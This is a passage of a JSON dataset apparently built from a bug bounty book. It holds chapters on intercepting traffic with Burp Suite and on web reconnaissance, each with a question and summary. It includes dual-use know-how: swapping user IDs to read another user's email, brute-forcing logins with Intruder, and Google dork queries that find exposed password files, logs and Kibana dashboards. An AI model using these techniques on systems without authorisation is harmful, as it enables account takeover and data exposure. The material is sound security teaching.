    "summary": "Internet security controls include data encoding methods like Base64 and hex, which help prevent data corruption during transmission. Session management uses cookies and session IDs to keep users logged in without re-authentication. Token-based authentication, such as JSON Web Tokens (JWT), relies on signed tokens to verify user identity, but vulnerabilities in implementation can allow attackers to forge tokens. The same-origin policy restricts scripts from one origin from accessing resources from another, preventing cross-site data theft."
  },
  {
    "start": 40,
    "end": 49,
    "text": "4\nENVIRONMENTAL SETUP AND\nTR AFFIC INTERCEPTION\nYou’ll save yourself a lot of time and head-\nache if you hunt for bugs within a well-oiled\nlab. In this chapter, I’ll guide you, step-by-step,\nthrough setting up your hacking environment.\nYou’ll configure your browser to work with Burp Suite,\na web proxy that lets you view and alter HTTP requests\nand responses sent between your browser and web serv-\ners. You’ll learn to use Burp’s features to intercept web\ntraffic, send automated and repeated requests, decode\nencoded content, and compare requests. I will also talk\nabout how to take good bug bounty notes.\nThis chapter focuses on setting up an environment for web hacking\nonly. If your goal is to attack mobile apps, you’ll need additional setup and\ntools. We’ll cover these in Chapter 23, which discusses mobile hacking.\nChoosing an Operating System\nBefore we go on, the first thing you need to do is to choose an operating\nsystem. Your operating system will limit the hacking tools available to you. I\nrecommend using a Unix-based system, like Kali Linux or macOS, because\nmany open source hacking tools are written for these systems. Kali Linux is\na Linux distribution designed for digital forensics and hacking. It includes\nmany useful bug bounty tools, such as Burp Suite, recon tools like DirBuster\nand Gobuster, and fuzzers like Wfuzz. You can download Kali Linux from\nhttps://www.kali.org/downloads/.\nIf these options are not available to you, feel free to use other operating\nsystems for hacking. Just keep in mind that you might have to learn to use\ndifferent tools than the ones mentioned in this book.\nSetting Up the Essentials: A Browser and a Proxy\nNext, you need a web browser and a web proxy. You’ll use the browser to\nexamine the features of a target application. I recommend using Firefox,\nsince it’s the simplest to set up with a proxy. You can also use two different\nbrowsers when hacking: one for browsing the target, and one for research-\ning vulnerabilities on the internet. This way, you can easily isolate the traf-\nfic of your target application for further examination.\nA proxy is software that sits between a client and a server; in this case,\nit sits between your browser and the web servers you interact with. It inter-\ncepts your requests before passing them to the server, and intercepts the\nserver’s responses before passing them to you, like this:\nBrowser <--------------> Proxy <--------------> Server\nUsing a proxy is essential in bug bounty hunting. Proxies enable you to\nview and modify the requests going out to the server and the responses com-\ning into your browser, as I’ll explain later in this chapter. Without a proxy,\nthe browser and the server would exchange messages automatically, without\nyour knowledge, and the only thing you would see is the final resulting web\npage. A proxy will instead capture all messages before they travel to their\nintended recipient.\nProxies therefore allow you to perform recon by examining and ana-\nlyzing the traffic going to and from the server. They also let you examine\ninteresting requests to look for potential vulnerabilities and exploit these\nvulnerabilities by tampering with requests.\nFor example, let’s say that you visit your email inbox and intercept the\nrequest that will return your email with a proxy. It’s a GET request to a URL\nthat contains your user ID. You also notice that a cookie with your user ID is\nincluded in the request:\nGET /emails/USER_ID HTTP/1.1\nHost: example.com\nCookie: user_id=USER_ID\n46 Chapter 4\nIn this case, you can try to change the USER_ID in the URL and the Cookie\nheader to another user’s ID and see if you can access another user’s email.\nTwo proxies are particularly popular with bug bounty hunters: Burp\nSuite and the Zed Attack Proxy (ZAP). This section will show you how to set\nup Burp, but you’re free to use ZAP instead.\nOpening the Embedded Browser\nBoth Burp Suite and ZAP come with embedded browsers. If you choose to\nuse these embedded browsers for testing, you can skip the next two steps.\nTo use Burp Suite’s embedded browser, click Open browser in Burp’s Proxy\ntab after it’s launched (Figure 4-1). This embedded browser’s traffic will be\nautomatically routed through Burp without any additional setup.\nFigure 4-1: You can use Burp’s embedded browser instead of your own external browser for testing.\nSetting Up Firefox\nBurp’s embedded browser offers a convenient way to start bug hunting with\nminimal setup. However, if you are like me and prefer to test with a browser\nyou are used to, you can set up Burp to work with your browser. Let’s set up\nBurp to work with Firefox.\nStart by downloading and installing your browser and proxy. You can\ndownload the Firefox browser from https://www.mozilla.org/firefox/new/ and\nBurp Suite from https://portswigger.net/burp/.\nBug bounty hunters use one of two versions of Burp Suite: Professional\nor Community. You have to purchase a license to use Burp Suite Professional,\nwhile the Community version is free of charge. Burp Suite Pro includes a\nvulnerability scanner and other convenient features like the option to save a\nwork session to resume later. It also offers a full version of the Burp intruder,\nwhile the Community version includes only a limited version. In this book, I\ncover how to use the Community version to hunt for bugs.\nNow you have to configure your browser to route traffic through your\nproxy. This section teaches you how to configure Firefox to work with Burp\nSuite. If you’re using another browser-proxy combination, please look up\ntheir official documentation for tutorials instead.\nEnvironmental Setup and Traffic Interception 47\nLaunch Firefox. Then open the Connections Settings page by choosing\nPreferencesGeneralNetwork Settings. You can access the Preferences\ntab from the menu at Firefox’s top-right corner (Figure 4-2).\nFigure 4-2: You can find the Preferences option\nat the top-right corner of Firefox.\nThe Connection Settings page should look like the one in Figure 4-3.\nSelect Manual proxy configuration and enter the IP address 127.0.0.1\nand port 8080 for all the protocol types. This will tell Firefox to use the\nservice running on port 8080 on your machine as a proxy for all of its traf-\nfic. 127.0.0.1 is the localhost IP address. It identifies your current computer,\nso you can use it to access the network services running on your machine.\nSince Burp runs on port 8080 by default, this setting tells Firefox to route\nall traffic through Burp. Click OK to finalize the setting. Now Firefox will\nroute all traffic through Burp.\n48 Chapter 4\nFigure 4-3: Configure Firefox’s proxy settings on the Connection Settings page.\nSetting Up Burp\nAfter downloading Burp Suite, open it and click Next, then Start Burp. You\nshould see a window like Figure 4-4.\nFigure 4-4: Burp Suite Community Edition startup window\nEnvironmental Setup and Traffic Interception 49\nNow let’s configure Burp so it can work with HTTPS traffic. HTTPS\nprotects your data’s privacy by encrypting your traffic, making sure only the\ntwo parties in a communication (your browser and the server) can decrypt\nit. This also means your Burp proxy won’t be able to intercept HTTPS traf-\nfic going to and from your browser. To work around this issue, you need to\nshow Firefox that your Burp proxy is a trusted party by installing its certifi-\ncate authority (CA) certificate.\nLet’s install Burp’s certificate on Firefox so you can work with HTTPS\ntraffic. With Burp open and running, and your proxy settings set to\n127.0.0.1:8080, go to http://burp/ in your browser. You should see a Burp wel-\ncome page (Figure 4-5). Click CA Certificate at the top right to download\nthe certificate file; then click Save File to save it in a safe location.\nFigure 4-5: Go to http://burp/ to download Burp’s CA certificate.\nNext, in Firefox, click PreferencesPrivacy & SecurityCertificates\nView CertificatesAuthorities. Click Import and select the file you just\nsaved, and then click Open. Follow the dialog’s instructions to trust the cer-\ntificate to identify websites (Figure 4-6).\nFigure 4-6: Select the Trust this CA to identify websites option in Firefox’s dialog.\nRestart Firefox. Now you should be all set to intercept both HTTP and\nHTTPS traffic.\nLet’s perform a test to make sure that Burp is working properly. Switch to\nthe Proxy tab in Burp and turn on traffic interception by clicking Intercept\nis off. The button should now read Intercept is on (Figure 4-7). This means\nyou’re now intercepting traffic from Firefox or the embedded browser.\n50 Chapter 4\nFigure 4-7: Intercept is on means that you’re now intercepting traffic.\nThen open Firefox and visit https://www.google.com/. In Burp’s proxy, you\nshould see the main window starting to populate with individual requests.\nThe Forward button in Burp Proxy will send the current request to the\ndesignated server. Click Forward until you see the request with the host-\nname www.google.com. If you see this request, Burp is correctly intercepting\nFirefox’s traffic. It should begin like this:\nGET / HTTP/1.1\nHost: www.google.com\nClick Forward to send the request over to Google’s server. You should\nsee Google’s home page appear in your Firefox window.\nIf you aren’t seeing requests in Burp’s window, you might not have\ninstalled Burp’s CA certificate properly. Follow the steps in this chapter to\nreinstall the certificate. In addition, check that you’ve set the correct proxy\nsettings to 127.0.0.1:8080 in Firefox’s Connection Settings.\nUsing Burp\nBurp Suite has a variety of useful features besides the web proxy. Burp Suite\nalso includes an intruder for automating attacks, a repeater for manipulating\nindividual requests, a decoder for decoding encoded content, and a comparer\ntool for comparing requests and responses. Of all Burp’s features, these are\nthe most useful for bug bounty hunting, so we’ll explore them here.\nEnvironmental Setup and Traffic Interception 51\nThe Proxy\nLet’s see how you can use the Burp proxy to examine requests, modify them,\nand forward them to Burp’s other modules. Open Burp and switch to the\nProxy tab, and start exploring what it does! To begin intercepting traffic,\nmake sure the Intercept button reads Intercept is on (Figure 4-8).\nFigure 4-8: The Burp Proxy tab shows Intercept is on.\nWhen you browse to a site on Firefox or Burp’s embedded browser, you\nshould see an HTTP/HTTPS request appear in the main window. When\nintercept is turned on, every request your browser sends will go through\nBurp, which won’t send them to the server unless you click Forward in the\nproxy window. You can use this opportunity to modify the request before\nsending it to the server or to forward it over to other modules in Burp.\nYou can also use the search bar at the bottom of the window to search for\nstrings in the requests or responses.\nTo forward the request to another Burp module, right-click the request\nand select Send to Module (Figure 4-9).\nLet’s practice intercepting and modifying traffic by using Burp Proxy!\nGo to Burp Proxy and turn on traffic interception. Then open Firefox or\nBurp’s embedded browser and visit https://www.google.com/. As you did in the\npreceding section, click Forward until you see the request with the host-\nname www.google.com. You should see a request like this one:\nGET / HTTP/1.1\nHost: www.google.com\nUser-Agent: Mozilla/5.0\n52 Chapter 4\nAccept-Language: en-US\nAccept-Encoding: gzip, deflate\nConnection: close\nFigure 4-9: You can forward the\nrequest or response to different\nBurp modules by right-clicking it.\nLet’s modify this request before sending it. Change the Accept-Language\nheader value to de.\nGET / HTTP/1.1\nHost: www.google.com\nUser-Agent: Mozilla/5.0\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nConnection: close\nClick Forward to send the request over to Google’s server. You should\nsee Google’s home page in German appear in your browser’s window\n(Figure 4-10).\nEnvironmental Setup and Traffic Interception 53\nFigure 4-10: Google’s home page in German\nIf you’re a German speaker, you could do the test in reverse: switch the\nAccept-Language header value from de to en. You should see the Google home\npage in English. Congratulations! You’ve now successfully intercepted, mod-\nified, and forwarded an HTTP request via a proxy.\nThe Intruder\nThe Burp intruder tool automates request sending. If you are using the\nCommunity version of Burp, your intruder will be a limited, trial version.\nStill, it allows you to perform attacks like brute-forcing, whereby an attacker\nsubmits many requests to a server using a list of predetermined values and\nsees if the server responds differently. For example, a hacker who obtains\na list of commonly used passwords can try to break into your account by\nrepeatedly submitting login requests with all the common passwords. You\ncan send requests over to the intruder by right-clicking a request in the\nproxy window and selecting Send to intruder.\nThe Target screen in the intruder tab lets you specify the host and port\nto attack (Figure 4-11). If you forward a request from the proxy, the host\nand port will be prefilled for you.\nFigure 4-11: You can specify the host and port to attack on the Target screen.\nThe intruder gives several ways to customize your attack. For each\nrequest, you can choose the payloads and payloads positions to use. The\npayloads are the data that you want to insert into specific positions in the\n54 Chapter 4\nrequest. The payload positions specify which parts of the request will be\nreplaced by the payloads you choose. For example, let’s say users log in to\nexample.com by sending a POST request to example.com/login. In Burp, this\nrequest might look like this:\nPOST /login HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml\nAccept-Language: en-US\nAccept-Encoding: gzip, deflate\nConnection: close\nusername=vickie&password=abc123\nThe POST request body contains two parameters: username and password.\nIf you were trying to brute-force a user’s account, you could switch up the\npassword field of the request and keep everything else the same. To do that,\nspecify the payload positions in the Positions screen (Figure 4-12). To add a\nportion of the request to the payload positions, highlight the text and click\nAdd on the right.\nFigure 4-12: You can specify the payload positions in the Positions screen.\nThen, switch over to the Payloads screen (Figure 4-13). Here, you\ncan choose payloads to insert into the request. To brute-force a login\npassword, you can add a list of commonly used passwords here. You can\nalso, for example, use a list of numbers with which to brute-force IDs in\nrequests, or use an attack payload list you downloaded from the internet.\nEnvironmental Setup and Traffic Interception 55\nReusing attack payloads shared by others can help you find bugs faster.\nWe will talk more about how to use reused payloads to hunt for vulner-\nabilities in Chapter 25.\nFigure 4-13: Choose your payload list on the Payloads screen.\nOnce you’ve specified those, click the Start attack button to start the\nautomated test. The intruder will send a request for each payload you listed\nand record all responses. You can then review the responses and response\ncodes and look for interesting results.\nThe Repeater\nThe repeater is probably the tool you’ll use the most often (Figure 4-14). You\ncan use it to modify requests and examine server responses in detail. You\ncould also use it to bookmark interesting requests to go back to later.\nAlthough the repeater and intruder both allow you to manipulate\nrequests, the two tools serve very different purposes. The intruder automates\nattacks by automatically sending programmatically modified requests. The\nrepeater is meant for manual, detailed modifications of a single request.\nSend requests to the repeater by right-clicking the request and selecting\nSend to repeater.\nOn the left of the repeater screen are requests. You can modify a request\nhere and send the modified request to the server by clicking Send at the top.\nThe corresponding response from the server will appear on the right.\nThe repeater is good for exploiting bugs manually, trying to bypass filters,\nand testing out different attack methods that target the same endpoint.\n56 Chapter 4\nFigure 4-14: The repeater is good for close examination of requests and manual exploitation.\nThe Decoder\nThe Burp decoder is a convenient way to encode and decode data you find in\nrequests and responses (Figure 4-15). Most often, I use it to decode, manip-\nulate, and re-encode application data before forwarding it to applications.\nFigure 4-15: You can use the decoder to decode application data to read or manipulate its plaintext.\nSend data to the decoder by highlighting a block of text in any request\nor response, then right-clicking it and selecting Send to decoder. Use the\ndrop-down menus on the right to specify the algorithm to use to encode\nor decode the message. If you’re not sure which algorithm the message is\nencoded with, try to Smart decode it. Burp will try to detect the encoding,\nand decode the message accordingly.\nEnvironmental Setup and Traffic Interception 57\nThe Comparer\nThe comparer is a way to compare requests or responses (Figure 4-16). It\nhighlights the differences between two blocks of text. You might use it to\nexamine how a difference in parameters impacts the response you get from\nthe server, for example.\nSend data over to the comparer by highlighting a block of text in any\nrequest or response, then right-clicking it and selecting Send to comparer.\nFigure 4-16: The comparer will highlight the differences between two blocks of text.\nSaving Burp Requests\nYou can save requests and responses on Burp as well. Simply right-click\nany request and select Copy URL, Copy as curl command, or Copy to file\nto store these results into your note folder for that target. The Copy URL\noption copies the URL of the request. The Copy as curl command copies\nthe entire request, including the request method, URL, headers, and body\nas a curl command. Copy to file saves the entire request to a separate file.\nA Final Note on . . . Taking Notes\nBefore you get started looking for vulnerabilities in the next chapter, a\nquick word of advice: organizational skills are critical if you want to succeed\nin bug bounties. When you work on targets with large scopes or hack mul-\ntiple targets at the same time, the information you gather from the targets\ncould balloon and become hard to manage.\nOften, you won’t be able to find bugs right away. Instead, you’ll spot a\nlot of weird behaviors and misconfigurations that aren’t exploitable at the\nmoment but that you could combine with other behavior in an attack later\non. You’ll need to take good notes about any new features, misconfigura-\ntions, minor bugs, and suspicious endpoints that you find so you can quickly\ngo back and use them.\nNotes also help you plan attacks. You can keep track of your hacking prog-\nress, the features you’ve tested, and those you still have to check. This prevents\nyou from wasting time by testing the same features over and over again.\n58 Chapter 4\nAnother good use of notes is to jot down information about the vulner-\nabilities you learn about. Record details about each vulnerability, such as its\ntheoretical concept, potential impact, exploitation steps, and sample proof-\nof-concept code. Over time, this will strengthen your technical skills and\nbuild up a technique repository that you can revisit if needed.\nSince these notes tend to balloon in volume and become very dis-\norganized, it’s good to keep them organized from the get-go. I like to take\nnotes in plaintext files by using Sublime Text (https://www.sublimetext.com/)\nand organize them by sorting them into directories, with subdirectories for\neach target and topic.\nFor example, you can create a folder for each target you’re working on,\nlike Facebook, Google, or Verizon. Then, within each of these folders, create\nfiles to document interesting endpoints, new and hidden features, reconnais-\nsance results, draft reports, and POCs.\nFind a note-taking and organizational strategy that works for you. For\nexample, if you are like me and prefer to store notes in plaintext, you can\nsearch around for an integrated development environment (IDE) or text\neditor that you feel the most comfortable in. Some prefer to take notes\nusing the Markdown format. In this case, Obsidian (https://obsidian.md/) is\nan excellent tool that displays your notes in an organized way. If you like to\nuse mind maps to organize your ideas, you can try the mind-mapping tool\nXMind (https://www.xmind.net/).\nKeep your bug bounty notes in a centralized place, such as an external\nhard drive or cloud storage service like Google Drive or Dropbox, and don’t\nforget to back up your notes regularly!\nIn summary, here are a few tips to help you take good notes:\n• Take notes about any weird behaviors, new features, misconfigura-\ntions, minor bugs, and suspicious endpoints to keep track of potential\nvulnerabilities.\n• Take notes to keep track of your hacking progress, the features you’ve\ntested, and those you still have to check.\n• Take notes while you learn: jot down information about each vulner-\nability you learn about, like its theoretical concept, potential impact,\nexploitation steps, and sample POC code.\n• Keep your notes organized from the get-go, so you can find them when\nyou need to!\n• Find a note-taking and organizational process that works for you. You\ncan try out note-taking tools like Sublime Text, Obsidian, and XMind\nto find a tool that you prefer.\nEnvironmental Setup and Traffic Interception 59",
    "question": "What are the key steps and tools needed to set up a web hacking environment and intercept traffic using Burp Suite?",
    "summary": "This chapter explains how to set up a hacking environment for web security testing, focusing on using Burp Suite to intercept and analyze web traffic. It covers configuring a browser like Firefox with a proxy, setting up Burp to handle HTTPS traffic, and using Burp's features such as the Proxy, Intruder, Repeater, Decoder, and Comparer. The chapter also emphasizes the importance of taking organized and detailed notes during bug bounty hunting to track findings and plan attacks effectively."
  },
  {
    "start": 50,
    "end": 76,
    "text": "5\nWEB HACKING RECONNAISSANCE\nThe first step to attacking any target is\nconducting reconnaissance, or simply put,\ngathering information about the target.\nReconnaissance is important because it’s how\nyou figure out an application’s attack surface. To look\nfor bugs most efficiently, you need to discover all the\npossible ways of attacking a target before deciding on\nthe most effective approach.\nIf an application doesn’t use PHP, for instance, there’s no reason to\ntest it for PHP vulnerabilities, and if the organization doesn’t use Amazon\nWeb Services (AWS), you shouldn’t waste time trying to crack its buckets.\nBy understanding how a target works, you can set up a solid foundation for\nfinding vulnerabilities. Recon skills are what separate a good hacker from\nan ineffective one.\nIn this chapter, I’ll introduce the most useful recon techniques for a\nbug bounty hunter. Then I’ll walk you through the basics of writing bash\nscripts to automate recon tasks and make them more efficient. Bash is a\nshell interpreter available on macOS and Linux systems. Though this chap-\nter assumes you’re using a Linux system, you should be able to install many\nof these tools on other operating systems as well. You need to install some\nof the tools we discuss in this chapter before using them. I have included\nlinks to all the tools at the end of the chapter.\nBefore you go on, please verify that you’re allowed to perform intrusive\nrecon on your target before you attempt any techniques that actively engage\nwith it. In particular, activities like port scanning, spidering, and directory\nbrute-forcing can generate a lot of unwanted traffic on a site and may not\nbe welcomed by the organization.\nManually Walking Through the Target\nBefore we dive into anything else, it will help to first manually walk through\nthe application to learn more about it. Try to uncover every feature in the\napplication that users can access by browsing through every page and click-\ning every link. Access the functionalities that you don’t usually use.\nFor example, if you’re hacking Facebook, try to create an event, play\na game, and use the payment functionality if you’ve never done so before.\nSign up for an account at every privilege level to reveal all of the applica-\ntion’s features. For example, on Slack, you can create owners, admins, and\nmembers of a workspace. Also create users who are members of different\nchannels under the same workspace. This way, you can see what the applica-\ntion looks like to different users.\nThis should give you a rough idea of what the attack surface (all of the\ndifferent points at which an attacker can attempt to exploit the application)\nlooks like, where the data entry points are, and how different users interact\nwith each other. Then you can start a more in-depth recon process: finding\nout the technology and structure of an application.\nGoogle Dorking\nWhen hunting for bugs, you’ll often need to research the details of a vul-\nnerability. If you’re exploiting a potential cross-site scripting (XSS) vulner-\nability, you might want to find a particular payload you saw on GitHub.\nAdvanced search-engine skills will help you find the resources you need\nquickly and accurately.\nIn fact, advanced Google searches are a powerful technique that hack-\ners often use to perform recon. Hackers call this Google dorking. For the\naverage Joe, Google is just a text search tool for finding images, videos, and\nweb pages. But for the hacker, Google can be a means of discovering valu-\nable information such as hidden admin portals, unlocked password files,\nand leaked authentication keys.\n62 Chapter 5\nGoogle’s search engine has its own built-in query language that helps\nyou filter your searches. Here are some of the most useful operators that\ncan be used with any Google search:\nsite\nTells Google to show you results from a certain site only. This will help\nyou quickly find the most reputable source on the topic that you are\nresearching. For example, if you wanted to search for the syntax of\nPython’s print() function, you could limit your results to the official\nPython documentation with this search: print site:python.org.\ninurl\nSearches for pages with a URL that match the search string. It’s a pow-\nerful way to search for vulnerable pages on a particular website. Let’s\nsay you’ve read a blog post about how the existence of a page called\n/course/jumpto.php on a website could indicate that it’s vulnerable to remote\ncode execution. You can check if the vulnerability exists on your target by\nsearching inurl:\"/course/jumpto.php\" site:example.com.\nintitle\nFinds specific strings in a page’s title. This is useful because it allows you\nto find pages that contain a particular type of content. For example,\nfile-listing pages on web servers often have index of in their titles.\nYou can use this query to search for directory pages on a website:\nintitle:\"index of\" site:example.com.\nlink\nSearches for web pages that contain links to a specified URL. You can\nuse this to find documentation about obscure technologies or vulner-\nabilities. For example, let’s say you’re researching the uncommon regu-\nlar expression denial-of-service (ReDoS) vulnerability. You’ll easily pull\nup its definition online but might have a hard time finding examples.\nThe link operator can discover pages that reference the vulnerability’s\nWikipedia page to locate discussions of the same topic: link:\"https://\nen.wikipedia.org/wiki/ReDoS\".\nfiletype\nSearches for pages with a specific file extension. This is an incredible\ntool for hacking; hackers often use it to locate files on their target sites\nthat might be sensitive, such as log and password files. For example, this\nquery searches for log files, which often have the .log file extension, on\nthe target site: filetype:log site:example.com.\nWildcard (*)\nYou can use the wildcard operator (*) within searches to mean any char-\nacter or series of characters. For example, the following query will return\nany string that starts with how to hack and ends with using Google. It will\nWeb Hacking Reconnaissance 63\nmatch with strings like how to hack websites using Google, how to hack appli-\ncations using Google, and so on: \"how to hack * using Google\".\nQuotes (\" \")\nAdding quotation marks around your search terms forces an exact match.\nFor example, this query will search for pages that contain the phrase how\nto hack: \"how to hack\". And this query will search for pages with the terms\nhow, to, and hack, although not necessarily together: how to hack.\nOr (|)\nThe or operator is denoted with the pipe character (|) and can be used\nto search for one search term or the other, or both at the same time.\nThe pipe character must be surrounded by spaces. For example, this\nquery will search for how to hack on either Reddit or Stack Overflow:\n\"how to hack\" site:(reddit.com | stackoverflow.com). And this query will\nsearch for web pages that mention either SQL Injection or SQLi: (SQL\nInjection | SQLi). SQLi is an acronym often used to refer to SQL injec-\ntion attacks, which we’ll talk about in Chapter 11.\nMinus (-)\nThe minus operator (-) excludes certain search results. For example,\nlet’s say you’re interested in learning about websites that discuss hacking,\nbut not those that discuss hacking PHP. This query will search for pages\nthat contain how to hack websites but not php: \"how to hack websites\" -php.\nYou can use advanced search engine options in many more ways to\nmake your work more efficient. You can even search for the term Google\nsearch operators to discover more. These operators can be more useful than\nyou’d expect. For example, look for all of a company’s subdomains by\nsearching as follows:\nsite:*.example.com\nYou can also look for special endpoints that can lead to vulnerabilities.\nKibana is a data visualization tool that displays server operation data such\nas server logs, debug messages, and server status. A compromised Kibana\ninstance can allow attackers to collect extensive information about a site’s\noperation. Many Kibana dashboards run under the path app/kibana, so this\nquery will reveal whether the target has a Kibana dashboard. You can then\ntry to access the dashboard to see if it’s unprotected:\nsite:example.com inurl:app/kibana\nGoogle can find company resources hosted by a third party online,\nsuch as Amazon S3 buckets (we’ll talk about these in more detail in “Third-\nParty Hosting” on page 74):\nsite:s3.amazonaws.com COMPANY_NAME\n64 Chapter 5\nLook for special extensions that could indicate a sensitive file. In addi-\ntion to .log, which often indicates log files, search for .php, cfm, asp, .jsp, and\n.pl, the extensions often used for script files:\nsite:example.com ext:php\nsite:example.com ext:log\nFinally, you can also combine search terms for a more accurate search.\nFor example, this query searches the site example.com for text files that con-\ntain password:\nsite:example.com ext:txt password\nIn addition to constructing your own queries, check out the Google\nHacking Database (https://www.exploit-db.com/google-hacking-database/), a\nwebsite that hackers and security practitioners use to share Google search\nqueries for finding security-related information. It contains many search\nqueries that could be helpful to you during the recon process. For example,\nyou can find queries that look for files containing passwords, common\nURLs of admin portals, or pages built using vulnerable software.\nWhile you are performing recon using Google search, keep in mind\nthat if you’re sending a lot of search queries, Google will start requiring\nCAPTCHA challenges for visitors from your network before they can per-\nform more searches. This could be annoying to others on your network, so I\ndon’t recommend Google dorking on a corporate or shared network.\nScope Discovery\nLet’s now dive into recon itself. First, always verify the target’s scope. A pro-\ngram’s scope on its policy page specifies which subdomains, products, and\napplications you’re allowed to attack. Carefully verify which of the compa-\nny’s assets are in scope to avoid overstepping boundaries during the recon\nand hacking process. For example, if example.com’s policy specifies that dev\n.example.com and test.example.com are out of scope, you shouldn’t perform any\nrecon or attacks on those subdomains.\nOnce you’ve verified this, discover what’s actually in the scope. Which\ndomains, subdomains, and IP addresses can you attack? What company\nassets is the organization hosting on these machines?\nWHOIS and Reverse WHOIS\nWhen companies or individuals register a domain name, they need to supply\nidentifying information, such as their mailing address, phone number, and\nemail address, to a domain registrar. Anyone can then query this information\nby using the whois command, which searches for the registrant and owner\ninformation of each known domain. You might be able to find the associated\ncontact information, such as an email, name, address, or phone number:\n$ whois facebook.com\nWeb Hacking Reconnaissance 65\nThis information is not always available, as some organizations and\nindividuals use a service called domain privacy, in which a third-party service\nprovider replaces the user’s information with that of a forwarding service.\nYou could then conduct a reverse WHOIS search, searching a database by\nusing an organization name, a phone number, or an email address to find\ndomains registered with it. This way, you can find all the domains that belong\nto the same owner. Reverse WHOIS is extremely useful for finding obscure or\ninternal domains not otherwise disclosed to the public. Use a public reverse\nWHOIS tool like ViewDNS.info (https://viewdns.info/reversewhois/) to conduct\nthis search. WHOIS and reverse WHOIS will give you a good set of top-level\ndomains to work with.\nIP Addresses\nAnother way of discovering your target’s top-level domains is to locate\nIP addresses. Find the IP address of a domain you know by running\nthe nslookup command. You can see here that facebook.com is located at\n157.240.2.35:\n$ nslookup facebook.com\nServer: 192.168.0.1\nAddress: 192.168.0.1#53\nNon-authoritative answer:\nName: facebook.com\nAddress: 157.240.2.35\nOnce you’ve found the IP address of the known domain, perform a\nreverse IP lookup. Reverse IP searches look for domains hosted on the same\nserver, given an IP or domain. You can also use ViewDNS.info for this.\nAlso run the whois command on an IP address, and then see if the tar-\nget has a dedicated IP range by checking the NetRange field. An IP range is a\nblock of IP addresses that all belong to the same organization. If the orga-\nnization has a dedicated IP range, any IP you find in that range belongs to\nthat organization:\n$ whois 157.240.2.35\nNetRange: 157.240.0.0 - 157.240.255.255\nCIDR: 157.240.0.0/16\nNetName: THEFA-3\nNetHandle: NET-157-240-0-0-1\nParent: NET157 (NET-157-0-0-0-0)\nNetType: Direct Assignment\nOriginAS:\nOrganization: Facebook, Inc. (THEFA-3)\nRegDate: 2015-05-14\nUpdated: 2015-05-14\nRef: https://rdap.arin.net/registry/ip/157.240.0.0\nOrgName: Facebook, Inc.\nOrgId: THEFA-3\nAddress: 1601 Willow Rd.\nCity: Menlo Park\nStateProv: CA\n66 Chapter 5\nPostalCode: 94025\nCountry: US\nRegDate: 2004-08-11\nUpdated: 2012-04-17\nRef: https://rdap.arin.net/registry/entity/THEFA-3\nOrgAbuseHandle: OPERA82-ARIN\nOrgAbuseName: Operations\nOrgAbusePhone: +1-650-543-4800\nOrgAbuseEmail: noc@fb.com\nOrgAbuseRef: https://rdap.arin.net/registry/entity/OPERA82-ARIN\nOrgTechHandle: OPERA82-ARIN\nOrgTechName: Operations\nOrgTechPhone: +1-650-543-4800\nOrgTechEmail: noc@fb.com\nOrgTechRef: https://rdap.arin.net/registry/entity/OPERA82-ARIN\nAnother way of finding IP addresses in scope is by looking at autonomous\nsystems, which are routable networks within the public internet. Autonomous\nsystem numbers (ASNs) identify the owners of these networks. By checking if\ntwo IP addresses share an ASN, you can determine whether the IPs belong to\nthe same owner.\nTo figure out if a company owns a dedicated IP range, run several IP-to-\nASN translations to see if the IP addresses map to a single ASN. If many\naddresses within a range belong to the same ASN, the organization might\nhave a dedicated IP range. From the following output, we can deduce that\nany IP within the 157.240.2.21 to 157.240.2.34 range probably belongs to\nFacebook:\n$ whois -h whois.cymru.com 157.240.2.20\nAS | IP | AS Name\n32934 | 157.240.2.20 | FACEBOOK, US\n$ whois -h whois.cymru.com 157.240.2.27\nAS | IP | AS Name\n32934 | 157.240.2.27 | FACEBOOK, US\n$ whois -h whois.cymru.com 157.240.2.35\nAS | IP | AS Name\n32934 | 157.240.2.35 | FACEBOOK, US\nThe -h flag in the whois command sets the WHOIS server to retrieve\ninformation from, and whois.cymru.com is a database that translates IPs to\nASNs. If the company has a dedicated IP range and doesn’t mark those\naddresses as out of scope, you could plan to attack every IP in that range.\nCertificate Parsing\nAnother way of finding hosts is to take advantage of the Secure Sockets Layer\n(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject\nAlternative Name field lets certificate owners specify additional hostnames\nthat use the same certificate, so you can find those hostnames by parsing this\nfield. Use online databases like crt.sh, Censys, and Cert Spotter to find certifi-\ncates for a domain.\nWeb Hacking Reconnaissance 67\nFor example, by running a certificate search using crt.sh for facebook.com,\nwe can find Facebook’s SSL certificate. You’ll see that that many other domain\nnames belonging to Facebook are listed:\nX509v3 Subject Alternative Name:\nDNS:*.facebook.com\nDNS:*.facebook.net\nDNS:*.fbcdn.net\nDNS:*.fbsbx.com\nDNS:*.messenger.com\nDNS:facebook.com\nDNS:messenger.com\nDNS:*.m.facebook.com\nDNS:*.xx.fbcdn.net\nDNS:*.xy.fbcdn.net\nDNS:*.xz.fbcdn.net\nThe crt.sh website also has a useful utility that lets you retrieve the\ninformation in JSON format, rather than HTML, for easier parsing. Just\nadd the URL parameter output=json to the request URL: https://crt.sh/\n?q=facebook.com&output=json.\nSubdomain Enumeration\nAfter finding as many domains on the target as possible, locate as many\nsubdomains on those domains as you can. Each subdomain represents\na new angle for attacking the network. The best way to enumerate sub-\ndomains is to use automation.\nTools like Sublist3r, SubBrute, Amass, and Gobuster can enumerate\nsubdomains automatically with a variety of wordlists and strategies. For\nexample, Sublist3r works by querying search engines and online subdomain\ndatabases, while SubBrute is a brute-forcing tool that guesses possible sub-\ndomains until it finds real ones. Amass uses a combination of DNS zone\ntransfers, certificate parsing, search engines, and subdomain databases to\nfind subdomains. You can build a tool that combines the results of multiple\ntools to achieve the best results. We’ll discuss how to do this in “Writing\nYour Own Recon Scripts” on page 80.\nTo use many subdomain enumeration tools, you need to feed the pro-\ngram a wordlist of terms likely to appear in subdomains. You can find some\ngood wordlists made by other hackers online. Daniel Miessler’s SecLists at\nhttps://github.com/danielmiessler/SecLists/ is a pretty extensive one. You can also\nuse a wordlist generation tool like Commonspeak2 (https://github.com/\nassetnote/commonspeak2/) to generate wordlists based on the most current\ninternet data. Finally, you can combine several wordlists found online or\nthat you generated yourself for the most comprehensive results. Here’s a\nsimple command to remove duplicate items from a set of two wordlists:\nsort -u wordlist1.txt wordlist2.txt\n68 Chapter 5\nThe sort command line tool sorts the lines of text files. When given\nmultiple files, it will sort all files and write the 